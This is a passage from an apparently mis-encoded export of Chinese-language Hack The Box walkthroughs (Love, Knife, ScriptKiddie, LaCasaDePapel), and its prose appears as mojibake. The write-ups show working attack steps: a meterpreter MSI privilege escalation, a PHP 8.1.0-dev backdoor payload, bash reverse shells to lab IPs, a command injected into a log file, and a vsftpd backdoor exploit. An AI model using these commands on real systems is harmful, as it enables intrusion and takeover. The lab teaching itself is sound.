**æƒé™æå‡**\næ‰¾åˆ°alwaysinstallelevatedï¼Œå³å½“æ³¨å†Œè¡¨ä¸­çš„alwaysinstallelevatedè®¾ç½®ä¸º1æ—¶ï¼Œæœºå™¨ä¸Šè¿è¡Œä»»ä½•çš„msiç¨‹åºï¼Œå‡ä¼šä»¥systemæƒé™æ‰§è¡Œï¼Œæˆ‘ä»¬åªéœ€ç”Ÿæˆä¸€ä¸ªmsiçš„æœ¨é©¬ç¨‹åºå³å¯ææƒã€‚\n\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹alwaysinstallelevatedçš„è®¾ç½®\n\n```bash\nreg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n```\n![](Hackthebox-Love/8c7f5b1a-6aae-4a4e-ab07-32806aa07967.png)\n\nç»“æœå‡ä¸º0x1ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨è¯¥æ¼æ´\n\nä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªmsié©¬\n\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.135 LPORT=5555 -f msi > shell.msi\n```\n![](Hackthebox-Love/2e07d007-32c8-4e1f-9fb8-c9e48238e52c.png)\n\nå†å•ç‹¬å¼€ä¸€ä¸ªmsfconsoleè¿›è¡Œç›‘å¬\n\n```bash\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.14.135\nset LPORT 5555\nexploit\n```\n![](Hackthebox-Love/d4e0207f-6e3b-46ab-a572-ca217a222f66.png)\n\nç„¶åä¸Šä¼ æˆ‘ä»¬çš„msié©¬\n\n![](Hackthebox-Love/0ec9e2cb-713b-4954-bac2-fc9469849dff.png)\n\næˆåŠŸä¸Šä¼ \n\nç„¶ååœ¨ä¹‹å‰è·å–çš„shellä¸­è¾“å…¥æŒ‡ä»¤shellå³å¯è¿›å…¥shellï¼ˆç»•å£ä»¤ï¼Ÿï¼‰\n\nä½¿ç”¨msiexec /quiet /qn /i shell.msiè¿è¡Œmsié©¬\n\n```bash\n/quiet = Suppress any messages to the user during installation\n/qn = No GUI\n/i = Regular (vs. administrative) installation\n```\n![](Hackthebox-Love/a8adb08c-1143-478f-82c9-28a5e9558f9a.png)\n\n![](Hackthebox-Love/ff1b7080-2315-44cd-acf7-45c574abc507.png)\n\nææƒæˆåŠŸ\n\n![](Hackthebox-Love/c0b55adc-cb18-4893-b6ee-a60286ef51ed.png)\n\næˆåŠŸè·å–åˆ°ç®¡ç†å‘˜æƒé™çš„shell","tags":["Hackthebox"]},{"title":"Knife - Hackthebox","url":"/2021/05/24/Hackthebox/Easy/Hackthebox-Knife/","content":"\n# Hackthebox - Knife\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Knife/15ebd948-9e9e-4db2-9a0d-6b58eb00e111.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Knife/a7e52db3-54c7-4bf3-99f1-f7bc84cb077f.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n![](Hackthebox-Knife/3d61a375-a663-4661-bb80-f03b76b45a6b.png)\n\næˆ‘ä»¬å¾—çŸ¥å¼€å¯äº†22å’Œ80ç«¯å£\n\nå‡ºäºèƒ½ä¸çˆ†ç ´å°±ä¸çˆ†ç ´çš„åŸåˆ™ï¼Œå…ˆè®¿é—®80ç«¯å£çœ‹ä¸€ä¸‹\n\n## Http\n![](Hackthebox-Knife/a61fd32c-dfc4-4f77-a654-fc3d3564e183.png)\n\n80ç«¯å£ä¸Šçš„å†…å®¹æœ‰ç‚¹ä¸æ˜æ‰€ä»¥ã€‚\n\nåœ¨å®Œå…¨æ²¡æ€è·¯çš„æƒ…å†µä¸‹ï¼Œå°è¯•ä½¿ç”¨dirbusterå·¥å…·è¿›è¡Œäº†ç›®å½•çˆ†ç ´ï¼Œä½†å››ååˆ†é’Ÿè¿‡å»äº†å´æ²¡æœ‰ä¸€ä¸ç‚¹æ”¶è·ï¼Œè¿robots.txté¡µé¢ä¹Ÿä¸å­˜åœ¨ã€‚\n\næˆ‘çš„æ€è·¯å°±å¡åœ¨è¿™é‡Œäº†ï¼Œä¸€æ—¶ä¹‹é—´ä¸çŸ¥é“åº”è¯¥æ€ä¹ˆåšï¼Œå°±å»æ³¡äº†æ¯èŒ¶ï¼Œçªç„¶æ¥äº†çµæ„Ÿï¼Œè¦ä¸å…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹ï¼Ÿ\n\n![](Hackthebox-Knife/6c777717-b915-411c-8527-fa96d51fb30a.png)\n\nä¹ä¸€çœ‹ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆå€¼å¾—å…³æ³¨çš„ä¸œè¥¿ï¼Œä½†åœ¨é€šå®µæ—¥é¶åœºå¯¼è‡´ç¥å¿—ä¸æ¸…åˆç»è¿‡äº†èŒ¶å¶æ´—ç¤¼çš„è„‘ç“œå­çš„å¼•å¯¼ä¸‹ï¼Œæˆ‘æ³¨æ„åˆ°äº†ä¸€ä¸ªç‚¹ã€‚\n\n```cpp\nX-Powered-By: PHP/8.1.0-dev\n```\nè¿™ä¸œè¥¿ï¼Œéšçº¦ä¹‹é—´è§‰å¾—ä¸ç®€å•ï¼Œä¾¿å»ç™¾åº¦è¿›è¡Œäº†æœç´¢ã€‚æœç´¢çš„åŒæ—¶å°è¯•äº†niktoå·¥å…·ï¼Œä¹Ÿæç¤ºäº†è¿™ä¸€æ¡\n\n![](Hackthebox-Knife/1bf61095-16b8-45e5-a3ea-f032b42a3d2a.png)\n\nå°±æ˜¯è¿™ä¸¤ä¸ªæç¤ºï¼Œè®©æˆ‘ç¡®ä¿¡çªç ´å£åœ¨è¿™ï¼Œç„¶åç»è¿‡å¤§é‡çš„googleå’Œç™¾åº¦æœç´¢åï¼Œæ‰¾åˆ°äº†ä¸€ä¸æ€è·¯ã€‚\n\nPHP 8.1.0-dev ç‰ˆæœ¬åœ¨2021å¹´3æœˆ28æ—¥è¢«æ¤å…¥åé—¨ï¼Œä½†æ˜¯åé—¨å¾ˆå¿«è¢«å‘ç°å¹¶æ¸…é™¤ã€‚å½“æœåŠ¡å™¨å­˜åœ¨è¯¥åé—¨æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€User-Agenttå¤´æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚\n\n# æ¼æ´åˆ©ç”¨\n![](Hackthebox-Knife/c1845bd9-d45b-4edc-a792-184423e1ad48.png)\n\nä½¿ç”¨burpæŠ“åŒ…ï¼Œå¹¶åŠ å…¥å­—æ®µ\n\n```cpp\nUser-Agentt: zerodiumvar_dump(2*3);\n```\nå‘ç°è¢«æˆåŠŸæ‰§è¡Œ\n\næ¥ç€å°è¯•å‘½ä»¤æ˜¯å¦å¯è¢«è§£ææ‰§è¡Œ\n\n```cpp\nUser-Agentt: zerodiumsystem(\"id\");\n```\n![](Hackthebox-Knife/7f2bcd66-d61d-4353-94d6-56cee2290f49.png)\n\nNice å‘½ä»¤å¯è¢«æ‰§è¡Œï¼Œé‚£å°±ç®€å•äº†ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£å°±å°è¯•getshellå§\n\næœ¬åœ°ç›‘å¬ï¼š\n\n```cpp\nNc â€“nvlp 9001\n```\næ‰§è¡Œå‘½ä»¤ï¼š\n\n```cpp\nUser-Agentt: zerodiumsystem(\"/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.240/9001 0>&1'\");\n```\n![](Hackthebox-Knife/7fef4f44-69ed-4c20-984c-42b911a65a6f.png)\n\næˆåŠŸé€šè¿‡ncè·å¾—äº†ä¸€ä¸ªshell\n\né¦–å…ˆç¡®å®šæ˜¯å¦æœ‰python\n\n```cpp\nWhich python3\n```\n![](Hackthebox-Knife/8409a9e1-ee94-4144-bcb2-64ec30da0aef.png)\n\nç¡®å®špython3å­˜åœ¨ï¼Œä½¿ç”¨python3è·å¾—ä¸€ä¸ªäº¤äº’å¼ shell ç¨‹åº\n\n```cpp\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n![](Hackthebox-Knife/627cb565-e7cd-4608-9107-0ba62eaf3800.png)\n\næˆåŠŸè·å¾—æ™®é€šç”¨æˆ·çš„flag\n\n# æƒé™æå‡\nå…ˆç¡®å®šknifeç”¨æˆ·çš„sudoæƒé™\n\n```bash\nSudo â€“l\nLs â€“al /usr/bin/knife\n```\n![](Hackthebox-Knife/166415a5-7729-4898-a0c8-3dd90577ba24.png)\n\nè¿›è¡Œææƒ\n\n```bash\necho \"system('chmod +s /bin/bash')\" > exploit.rb\nls\nsudo /usr/bin/knife exec exploit.rb\nls -al /bin/bash\n/bin/bash â€“p\n```\n![](Hackthebox-Knife/9bd29c84-d31d-41c9-af25-53022c05fe37.png)\n\nè·å¾—rootç”¨æˆ·çš„flag\n\n![](Hackthebox-Knife/997a63c7-c726-4518-9c9e-3f57974e4a40.png)","tags":["Hackthebox"]},{"title":"ScriptKiddie - Hackthebox","url":"/2021/05/24/Hackthebox/Easy/Hackthebox-ScriptKiddie/","content":"\n# Hackthebox - ScriptKiddie\n**Hackthebox-ScriptKiddieé¶åœºå®æˆ˜**\n\né¶åœºä¿¡æ¯\n\n![](Hackthebox-ScriptKiddie/7a534b9d-b47d-45a8-8740-b7309044837f.png)\n\né¶åœºç±»å‹\n\n![](Hackthebox-ScriptKiddie/a2ea7254-49e2-42b9-b0c6-e4592efdf79a.png)\n\nä¿¡æ¯æœé›†\n\nå…ˆä½¿ç”¨nmapè¿›è¡Œæœ€åŸºæœ¬çš„ç«¯å£æ‰«æ\n\nnmap -A -sS -sV -sC 10.10.10.226\n\n![](Hackthebox-ScriptKiddie/e511ae46-85df-4431-b5fa-f913d377841e.png)\n\nå‘ç°å¼€å¯äº†22ç«¯å£å’Œ5000ç«¯å£ï¼Œå†æ¬¡åŸºäºèƒ½ä¸çˆ†ç ´å°±ä¸çˆ†ç ´çš„åŸåˆ™ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹5000ç«¯å£\n\n5000ç«¯å£ä¸Šè¿è¡Œäº†Werkzeugï¼Œé€šè¿‡googleæœç´¢å‘ç°Werkzeugå­˜åœ¨Werkzeg debug shellæ¼æ´ï¼Œä½†å¯¹æ¯”äº†ä¸‹ç‰ˆæœ¬ä¸é€‚ç”¨ï¼Œé‚£å°±åªèƒ½å…ˆè®¿é—®5000ç«¯å£çœ‹çœ‹å…·ä½“æƒ…å†µäº†\n\n![](Hackthebox-ScriptKiddie/c9e0df80-af0f-4eeb-b592-dcb2c36736ce.png)\n\nè¿™æ˜¯ä¸€ä¸ªç»§æ‰¿äº†nmapã€msfvenomã€searchsploitå·¥å…·çš„ä¸€ä¸ªå°é»‘å®¢å·¥å…·ï¼Ÿé‚£å°±å…ˆå°è¯•ä¸€ä¸‹ä»–çš„å·¥å…·å§ã€‚ä½¿ç”¨nmapæ‰«æä¸€ä¸‹æœ¬åœ°ç«¯å£\n\n![](Hackthebox-ScriptKiddie/9c50b024-27d9-4f09-8c2a-241750fde5f9.png)\n\næˆ‘ä»¬è·å¾—çš„ä¿¡æ¯æœ‰nmapç‰ˆæœ¬ä¸º7.80\n\nå°è¯•æœç´¢æ¼æ´\n\n![](Hackthebox-ScriptKiddie/79b6d3da-5196-4fe9-8a3d-3d9c9e17c39a.png)\n\né€šè¿‡googleå’Œexploit-dbå‡æœªå‘ç°å¯getshellçš„æ¼æ´ï¼Œæ”¾å¼ƒè¯¥æ€è·¯\n\næ¼æ´åˆ©ç”¨\n\næˆ‘ä»¬æŠŠç›®å…‰æ”¾åˆ°ç¬¬äºŒä¸ªå·¥å…·msfvenomä¸Š\n\næœç´¢venomå‘ç°äº†ä¸€ä¸ªAPKæ¨¡æ¿å‘½ä»¤æ³¨å…¥æ¼æ´\n\n![](Hackthebox-ScriptKiddie/e06af414-5690-4847-b3f7-6dd764f269f3.png)\n\nå°†exploit-dbä¸Šçš„expç»™ä¸‹è½½ä¸‹æ¥å¹¶è¿›è¡Œä¿®æ”¹\n\n![](Hackthebox-ScriptKiddie/ebf005c2-ff4a-444a-a859-66c97e8b5a99.png)\n\nç„¶åæ‰§è¡Œè¯¥EXP\n\n![](Hackthebox-ScriptKiddie/60b36e3f-7d3b-4c29-94de-6b81213f15db.png)\n\nè·å¾—äº†evil.apkæ–‡ä»¶ï¼Œåœ¨æœ¬åœ°ç›‘å¬443ç«¯å£åå°†è¯¥æ–‡ä»¶ä¸Šä¼ \n\n![](Hackthebox-ScriptKiddie/f3b36089-d3b0-4ac1-8f99-998f98936d63.png)\n\n![](Hackthebox-ScriptKiddie/028bb04c-a9a9-4b7a-bcb2-d5756b1516cc.png)\n\nèƒ½å¼¹å›æ¥ï¼Œä½†shellä¼¼ä¹æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨msfæ¥ç”Ÿæˆï¼Œå…å»éº»çƒ¦\n\né¦–å…ˆè¿è¡Œmsfç„¶å\n\nuse exploit/unix/fileformat/metasploit\\_msfvenom\\_apk\\_template\\_cmd\\_injectionæ¥è½½å…¥exp\n\nè®¾ç½®å¥½ipå’Œç«¯å£åè¾“å…¥exploitæ‰§è¡Œ\n\n![](Hackthebox-ScriptKiddie/b31ff21e-ad67-4c22-9696-dd1badb88371.png)\n\nè·å¾—è„šæœ¬/root/.msf4/local/msf.apk\n\n![](Hackthebox-ScriptKiddie/d68c6f85-2144-4e3a-94a4-dd3694782525.png)\n\nç„¶åæœ¬åœ°ä½¿ç”¨ncç›‘å¬4444ç«¯å£\n\nNc â€“nvlp 4444\n\nä½¿ç”¨5000ç«¯å£ä¸Šçš„ç¬¬äºŒä¸ªè„šæœ¬è¿›è¡Œä¸Šä¼ \n\n![](Hackthebox-ScriptKiddie/2cbbcdc9-3312-4910-93b3-33f09d8ae062.png)\n\næˆåŠŸåå¼¹å›ä¸€ä¸ªshellï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è·å¾—ä¸€ä¸ªç¨³å®šçš„shell\n\nSHELL=/bin/bash script -q /dev/null\n\n![](Hackthebox-ScriptKiddie/60e7863d-313d-47a7-9eba-435f6aad39d4.png)\n\nåœ¨æ ¹ç›®å½•ä¸‹æˆ‘ä»¬æˆåŠŸå–å¾—æ™®é€šç”¨æˆ·çš„flag\n\n![](Hackthebox-ScriptKiddie/2fe629f8-2b73-447e-8baa-fa3016fbf1e8.png)\n\næƒé™æå‡\n\nè¿›å…¥homeç›®å½•ï¼Œå‘ç°é™¤äº†æˆ‘ä»¬ä½¿ç”¨çš„kidç”¨æˆ·ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªpwnç”¨æˆ·\n\n![](Hackthebox-ScriptKiddie/78ee58dc-3fe4-4ef7-91ac-1fb04f9a294e.png)\n\nè¿›å…¥ç›®å½•å¹¶æŸ¥çœ‹æ–‡ä»¶\n\n![](Hackthebox-ScriptKiddie/d41b4682-8f47-4d28-957a-18b394c5cab2.png)\n\nå‘ç°æœ‰ä¸€ä¸ªscanlosers.shè„šæœ¬\n\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è„šæœ¬å†…å®¹\n\n![](Hackthebox-ScriptKiddie/2c2e4c6b-a2d9-4567-afd9-5c9afe03a966.png)\n\nè¯¥è„šæœ¬ä¼šä¸€ç›´æ‰«æ/home/kid/logs/hackersçš„ç›®å½•æ–‡ä»¶çš„IPåœ°å€\n\nè¯¥è„šæœ¬æœªå¯¹hackersæ–‡ä»¶ä¼ å…¥çš„å†…å®¹åšè¿‡æ»¤ï¼Œå¹¶ä¸”æˆ‘ä»¬ä½¿ç”¨çš„kidç”¨æˆ·ä¹Ÿæœ‰å¯¹è¯¥æ–‡ä»¶çš„ç¼–è¾‘æƒé™ï¼Œæˆ‘ä»¬ç›´æ¥å†™å…¥ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œæ¥è®©ä»–æŠŠpwnç”¨æˆ·çš„æƒé™åå¼¹ç»™æˆ‘ä»¬\n\næˆ‘ä»¬æœ¬åœ°ç›‘å¬ä¸€ä¸ªæ–°çš„ç«¯å£5555\n\nNc â€“nvlp 5555\n\n![](Hackthebox-ScriptKiddie/83530a5b-8c31-4822-a7de-1752b3a4b84d.png)\n\nå…ˆåˆ‡æ¢åˆ°logsç›®å½•\n\nCd logs\n\n![](Hackthebox-ScriptKiddie/38bef9fc-4097-43d6-a2c3-8646c4ecc1fc.png)\n\nç„¶åå†™å…¥æ¶æ„ä»£ç \n\necho \" ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.135/5555 0>&1' #\" >> hackers\n\nç›´æ¥ä½¿ç”¨echoè¾“å…¥ï¼Œæˆ–æ˜¯æ‰‹åŠ¨ç¼–è¾‘å‡å¯ï¼Œåªè¦èƒ½æŠŠå‘½ä»¤å†™å…¥è¿›å»å³å¯\n\n![](Hackthebox-ScriptKiddie/b843ae8b-a7e9-42b4-80d0-b00cc509f91e.png)\n\nå†™å…¥æˆåŠŸï¼Œå¹¶æˆåŠŸåå¼¹å›pwnç”¨æˆ·çš„shell\n\n![](Hackthebox-ScriptKiddie/8ba61c98-c746-4b19-9207-ae5227af30e3.png)\n\nä½¿ç”¨sudo -læ£€æŸ¥ä¸€ä¸‹pwnç”¨æˆ·çš„æƒé™\n\n![](Hackthebox-ScriptKiddie/a04c9bef-b633-4245-b0f3-05a36f1fe0d2.png)\n\nå‘ç°pwnç”¨æˆ·æ‹¥æœ‰msfçš„æƒé™ï¼Œä¸”ä¸éœ€è¦rootå¯†ç ï¼Œç›´æ¥è¿›å…¥msfè°ƒç”¨rootæƒé™\n\nsudo /opt/metasploit-framework-6.0.9/msfconsole\n\n![](Hackthebox-ScriptKiddie/b59b1ab2-6caf-4016-a35f-77ff3617faa6.png)\n\næˆåŠŸä½¿ç”¨rootæƒé™è¿›å…¥msfï¼Œæ­¤æ—¶å’±ä»¬å·²ç»æ‹¥æœ‰rootæƒé™ï¼Œç›´æ¥è¿›å…¥rootç›®å½•æ‹¿rootç”¨æˆ·çš„flagå³å¯\n\n![](Hackthebox-ScriptKiddie/3ba5507b-c0b2-4ae4-82b4-0c1ae9bd44a1.png)\n\næˆåŠŸæ‹¿ä¸‹rootæƒé™çš„flag\n\næ”¶å·¥ç¡è§‰","tags":["Hackthebox"]},{"title":"LaCasaDePapel - Hackthebox","url":"/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/","content":"\n# Hackthebox - LaCasaDePapel\n\n# é¶åœºä¿¡æ¯\n![](Hackthebox-LaCasaDePapel/6b58Ut0mtbPB0F60tlaOYk9wK0SSnrcaQH4TKrGZ7-I.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-LaCasaDePapel/fM0Aoky4NfvsaJCOKqpG_2CribG6BAjZwdWyXy5r570.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.131\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:07 CST\nNmap scan report for 10.10.10.131\nHost is up (0.51s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT     STATE    SERVICE  VERSION\n21/tcp   open     ftp      vsftpd 2.3.4\n22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)\n| ssh-hostkey: \n|   2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA)\n|   256 41e495a3390b25f9dadebe6adc59486d (ECDSA)\n|_  256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519)\n80/tcp   open     http     Node.js (Express middleware)\n|_http-title: La Casa De Papel\n443/tcp  open     ssl/http Node.js Express framework\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Server returned status 401 but no WWW-Authenticate header.\n| tls-alpn: \n|_  http/1.1\n| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel\n| Not valid before: 2019-01-27T08:35:30\n|_Not valid after:  2029-01-24T08:35:30\n| tls-nextprotoneg: \n|   http/1.1\n|_  http/1.0\n|_ssl-date: TLS randomness does not represent time\n6200/tcp filtered lm-x\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/9%OT=21%CT=1%CU=43703%PV=Y%DS=2%DC=T%G=Y%TM=63BB22C2\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O\nOS:1=M537ST11NW6%O2=M537ST11NW6%O3=M537NNT11NW6%O4=M537ST11NW6%O5=M537ST11N\nOS:W6%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R\nOS:=Y%DF=Y%T=40%W=7210%O=M537NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%\nOS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y\nOS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R\nOS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=\nOS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S\nOS:)\n\nNetwork Distance: 2 hops\nService Info: OS: Unix\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   386.92 ms 10.10.16.1\n2   632.59 ms 10.10.10.131\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 86.65 seconds\n```\n## Http\n![](Hackthebox-LaCasaDePapel/X-hpNQ3_TscJc9tVQPDCr4IvF_5fvPnRyNR1dSwUt0U.png)\n\né¦–é¡µé¢æ²¡ä»€ä¹ˆå¯ä»¥ç‚¹çš„ï¼Œ`GET FREE TRIAL` ç‚¹äº†æ— æ•ˆï¼Œåšä¸€ä¸‹ä¿¡æ¯æ”¶é›†çœ‹çœ‹æŠŠ\n\n![](Hackthebox-LaCasaDePapel/BkOtU0i4yqSm_bIdlzC9-H2DpbO9HjVvTvNMPB7rjSE.png)\n\nä½¿ç”¨ https è®¿é—®ï¼Œä¼šæç¤ºéœ€è¦æä¾›å®¢æˆ·ç«¯è¯ä¹¦æ‰å¯ä»¥ä½¿ç”¨\n\nè¿™é‡Œæ‰«ç›®å½•ä¹Ÿæ²¡æ‰«å‡ºå…¶ä»–ä¸œè¥¿ï¼Œæˆ‘ä»¬å»çœ‹çœ‹å…¶ä»–æ€è·¯\n\n# æ¼æ´åˆ©ç”¨\n# Ftp\nç›®å‰ ftp ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ `vsftpd 2.3.4` ï¼Œæˆ‘å°è±¡ä¸­æ˜¯æœ‰æ¼æ´çš„ï¼Œå»æœç´¢ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# searchsploit vsftpd 2.3.4\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                   |  Path\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nç¡®å®æ˜¯æœ‰ä¸€ä¸ªæ¼æ´ï¼Œä¸€ä¸ªåé—¨å‘½ä»¤æ‰§è¡Œï¼Œä½¿ç”¨ä¸Šé¢é‚£ä¸ªè„šæœ¬æ²¡æˆåŠŸï¼Œå»å°è¯•ä¸€ä¸‹ msf å§\n\n```bash\nmsf6 > search vsftpd 2.3.4\n\nMatching Modules\n================\n\n   #  Name                                  Disclosure Date  Rank       Check  Description\n   -  ----                                  ---------------  ----       -----  -----------\n   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor\n\nmsf6 > use 0\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options \n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit\n   RPORT   21               yes       The target port (TCP)\n\n\nPayload options (cmd/unix/interact):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\n\nView the full module info with the info, or info -d command.\n```\næˆ‘ä»¬å¡«å†™ä¸ŠåŸŸåï¼Œç„¶åç›´æ¥è¿è¡Œ\n\n```bash\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.131\nrhosts => 10.10.10.131\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit \n\n[*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open\n[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell\n[*] Exploit completed, but no session was created.\n```\nè¿™é‡Œä¼¼ä¹æç¤ºåœ¨ 6200 ç«¯å£ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†ä¸€ä¸‹ 6200 ç«¯å£ä¹Ÿæ˜¯æ— æ³•åˆ©ç”¨çš„ï¼Œåœ¨ nmap çš„æ—¶å€™ 6200 ç«¯å£ä¹Ÿæ˜¯ filtered çŠ¶æ€çš„ï¼Œå»å°è¯•ç›´æ¥è¿æ¥è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nc 10.10.10.131 6200\nPsy Shell v0.9.9 (PHP 7.2.10 â€” cli) by Justin Hileman\nhelp\n  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     \n  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             \n  dump       Dump an object or primitive.                                                                                \n  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             \n  show       Show the code for an object, class, constant, method or property.                                           \n  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  \n  whereami   Show where you are in the code.                                                                             \n  throw-up   Throw an exception or error out of the Psy Shell.                                                           \n  timeit     Profiles with a timer.                                                                                      \n  trace      Show the current call stack.                                                                                \n  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   \n  clear      Clear the Psy Shell screen.                                                                                 \n  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     \n  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       \n  history    Show the Psy Shell history.                                                  Aliases: hist                  \n  exit       End the current session and return to caller.                                Aliases: quit, q\n```\nä¼¼ä¹æ˜¯ä¸€ä¸ª shell\n\nè¿™é‡Œæˆ‘æœ‰ç‚¹æ„Ÿå…´è¶£ï¼Œå»å†æ¬¡æ‰«æä¸€ä¸‹è¿™ä¸ªç«¯å£è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -vvv -p6200 10.10.10.131                        \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:39 CST\nInitiating Ping Scan at 04:39\nScanning 10.10.10.131 [4 ports]\nCompleted Ping Scan at 04:39, 0.43s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 04:39\nCompleted Parallel DNS resolution of 1 host. at 04:39, 0.01s elapsed\nDNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 04:39\nScanning 10.10.10.131 [1 port]\nDiscovered open port 6200/tcp on 10.10.10.131\nCompleted SYN Stealth Scan at 04:39, 0.45s elapsed (1 total ports)\nNmap scan report for 10.10.10.131\nHost is up, received syn-ack ttl 63 (0.39s latency).\nScanned at 2023-01-09 04:39:23 CST for 1s\n\nPORT     STATE SERVICE REASON\n6200/tcp open  lm-x    syn-ack ttl 63\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.99 seconds\n           Raw packets sent: 5 (196B) | Rcvd: 5 (196B)\n```\nå†æ¬¡æ‰«ææ˜¾ç¤ºçš„å´æ˜¯ openï¼Œé‚£è¯æ˜ä¹‹å‰çš„è„šæœ¬å¯¹è¿™å°æœåŠ¡å™¨åšäº†ä»€ä¹ˆï¼Œå»æŠŠæœºå™¨è¿˜åŸä¸€ä¸‹ï¼Œç„¶åå†å»çœ‹çœ‹æ¼æ´è¯¦æƒ…\n\n```bash\n# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution\n# Date: 9-04-2021\n# Exploit Author: HerculesRD\n# Software Link: 